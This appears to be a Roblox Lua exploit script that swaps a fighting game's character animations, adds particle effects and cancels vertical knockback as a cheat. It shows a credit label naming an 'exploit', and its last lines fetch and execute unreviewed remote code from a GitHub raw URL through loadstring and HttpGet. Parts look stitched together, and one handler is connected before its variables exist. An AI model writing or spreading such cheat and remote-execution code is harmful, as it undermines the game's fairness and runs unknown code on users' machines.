local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://17838006839"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0


Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1.1)


delay(1.2, function()

    Anim:Stop()

end)


    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local animationId = 10470104242


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local function onAnimationPlayed(animationTrack)

    if animationTrack.Animation.AnimationId == "rbxassetid://" .. animationId then

local p = game.Players.LocalPlayer

local Humanoid = p.Character:WaitForChild("Humanoid")


for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do

    animTrack:Stop()

end


local AnimAnim = Instance.new("Animation")

AnimAnim.AnimationId = "rbxassetid://17858878027"

local Anim = Humanoid:LoadAnimation(AnimAnim)


local startTime = 0

Anim:Play()

Anim:AdjustSpeed(0)

Anim.TimePosition = startTime

Anim:AdjustSpeed(1.8)
local launch1 = game.ReplicatedStorage.Resources.KJEffects["launchup"].launchything:Clone()
            launch1.Parent = game.Players.LocalPlayer.Character["Torso"]
                for _, child in ipairs(launch1:GetChildren()) do
                    if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
                        child:Emit(2) -- Emit 20 particles
                    end
                end


    end

end

humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local Players = game:GetService("Players")

local player = Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoid = character:WaitForChild("Humanoid")


local animationIdsToStop = {

    [10469493270] = true,

    [10469630950] = true,

    [10469639222] = true,

    [10469643643] = true,

}


local replacementAnimations = {

    ["10469643643"] = "rbxassetid://13378708199",

    ["10469639222"] = "rbxassetid://13295919399",

    ["10469630950"] = "rbxassetid://17889290569",

    ["10469493270"] = "rbxassetid://17889458563",

}


local queue = {}

local isAnimating = false


local function playReplacementAnimation(animationId)

    if isAnimating then

        table.insert(queue, animationId)

        return

    end

   

    isAnimating = true

    local replacementAnimationId = replacementAnimations[tostring(animationId)]

    if replacementAnimationId then

        local AnimAnim = Instance.new("Animation")

        AnimAnim.AnimationId = replacementAnimationId

        local Anim = humanoid:LoadAnimation(AnimAnim)

        Anim:Play()

       

        Anim.Stopped:Connect(function()

            isAnimating = false

            if #queue > 0 then

                local nextAnimationId = table.remove(queue, 1)

                playReplacementAnimation(nextAnimationId)

            end

        end)

    else

        isAnimating = false

    end

end


local function stopSpecificAnimations()

    for _, track in ipairs(humanoid:GetPlayingAnimationTracks()) do

        local animationId = tonumber(track.Animation.AnimationId:match("%d+"))

        if animationIdsToStop[animationId] then

            track:Stop()

        end

    end

end


local function onAnimationPlayed(animationTrack)

    local animationId = tonumber(animationTrack.Animation.AnimationId:match("%d+"))

    if animationIdsToStop[animationId] then

        stopSpecificAnimations()

        animationTrack:Stop()

       

        local replacementAnimationId = replacementAnimations[tostring(animationId)]

        if replacementAnimationId then

            playReplacementAnimation(animationId)

        end

    end

end


humanoid.AnimationPlayed:Connect(onAnimationPlayed)


local player = game.Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

local humanoidRootPart = character:WaitForChild("HumanoidRootPart")


local function onBodyVelocityAdded(bodyVelocity)

    if bodyVelocity:IsA("BodyVelocity") then

        bodyVelocity.Velocity = Vector3.new(bodyVelocity.Velocity.X, 0, bodyVelocity.Velocity.Z)

    end

end


character.DescendantAdded:Connect(onBodyVelocityAdded)


for _, descendant in pairs(character:GetDescendants()) do

    onBodyVelocityAdded(descendant)

end


player.CharacterAdded:Connect(function(newCharacter)

    character = newCharacter

    humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    character.DescendantAdded:Connect(onBodyVelocityAdded)

   

    for _, descendant in pairs(character:GetDescendants()) do

        onBodyVelocityAdded(descendant)

    end

end)
-- b64 decode
local function decodeBase64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f = '',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- sgui
local sG = Instance.new("ScreenGui")
sG.Name = "UIContainer"
sG.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- txlabel
local tL = Instance.new("TextLabel")
tL.Size = UDim2.new(1, 0, 0, 16) -- smaller size
tL.Position = UDim2.new(0, 0, 0, 0) -- Top
tL.BackgroundTransparency = 1 -- by
tL.Text = "Credit by golden head and tp exploit" -- put the credit name
tL.TextColor3 = Color3.new(1, 1, 1) -- clr
tL.Font = Enum.Font.Arcade 
tL.TextScaled = true -- scale
tL.TextTransparency = 0.7 -- opaque
tL.Parent = sG


local success, err = pcall(function()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Idk%20what%20is%20this'))()  
end)
if not success then
    warn("Failed to load external script:", err)
end